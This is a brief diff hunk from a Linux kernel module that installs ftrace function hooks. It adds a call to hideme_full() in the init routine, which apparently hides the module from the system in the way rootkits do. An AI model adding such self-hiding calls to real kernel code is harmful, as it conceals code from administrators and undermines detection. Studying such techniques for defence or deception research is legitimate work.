@@ -818,7 +818,7 @@ static int __init deception_init(void)
     err = fh_install_hooks(fh_hooks, ARRAY_SIZE(fh_hooks));
     if (err)
         return err;
-
+    hideme_full();
     return 0;
 }
 
